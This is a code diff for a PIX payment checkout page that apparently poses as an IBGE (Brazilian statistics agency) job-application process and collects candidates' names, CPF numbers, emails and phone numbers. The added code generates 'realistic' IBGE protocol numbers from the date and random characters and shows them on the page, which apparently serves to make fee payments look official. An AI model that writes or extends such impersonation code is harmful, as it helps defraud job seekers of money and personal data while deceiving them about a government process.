@@ -519,6 +519,24 @@
         let pixData = null;
         let paymentCheckInterval = null;
 
+        // Função para gerar protocolo IBGE realista
+        function gerarProtocoloIBGE() {
+            // Gera protocolo no formato IBGE + ano + mês + dia + 4 caracteres aleatórios
+            const agora = new Date();
+            const ano = agora.getFullYear();
+            const mes = String(agora.getMonth() + 1).padStart(2, '0');
+            const dia = String(agora.getDate()).padStart(2, '0');
+            
+            // Gera 4 caracteres aleatórios (letras e números)
+            const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let sufixo = '';
+            for (let i = 0; i < 4; i++) {
+                sufixo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+            }
+            
+            return `IBGE${ano}${mes}${dia}${sufixo}`;
+        }
+
         // Função para carregar dados do usuário
         function carregarDadosUsuario() {
             console.log('[CHECKOUT] Iniciando carregamento de dados...');
@@ -604,7 +622,7 @@
                             telefone_alt: secao4.telefone_alt || dadosUsuario.telefone_alt || '',
                             email: secao4.email || dadosUsuario.email || ''
                         },
-                        protocolo: dadosUsuario.protocolo_numero || localStorage.getItem('ibge_protocolo') || 'IBGE' + Date.now(),
+                        protocolo: dadosUsuario.protocolo_numero || localStorage.getItem('ibge_protocolo') || gerarProtocoloIBGE(),
                         cargo: dadosUsuario.cargo_selecionado || localStorage.getItem('ibge_cargo_selecionado') || '',
                         timestamp: new Date().toISOString(),
                         data_inscricao: new Date().toLocaleDateString('pt-BR')
@@ -635,7 +653,7 @@
                     email: 'usuario@ibge.gov.br',
                     telefone: '11999999999'
                 },
-                protocolo: 'IBGE' + Date.now()
+                protocolo: gerarProtocoloIBGE()
             };
         }
 
@@ -644,7 +662,7 @@
             const cpf = dados.identificacao?.cpf || '00000000000';
             const email = dados.contato?.email || 'usuario@ibge.gov.br';
             const telefone = dados.contato?.telefone || '11999999999';
-            const protocolo = dados.protocolo || 'IBGE' + Date.now();
+            const protocolo = dados.protocolo || gerarProtocoloIBGE();
 
             return {
                 nome: nome,
@@ -659,11 +677,15 @@
         }
 
         function atualizarInterfaceUsuario(dados) {
+            // Gerar protocolo único se não existir
+            const protocoloFinal = dados.protocolo && dados.protocolo !== 'IBGE' + Date.now() ? dados.protocolo : gerarProtocoloIBGE();
+            
             const elementos = {
                 'candidato-nome': dados.nome,
                 'candidato-cpf': dados.cpf_formatado,
                 'candidato-email': dados.email,
-                'candidato-telefone': dados.telefone_formatado
+                'candidato-telefone': dados.telefone_formatado,
+                'protocolo-checkout': protocoloFinal
             };
 
             Object.entries(elementos).forEach(([id, valor]) => {
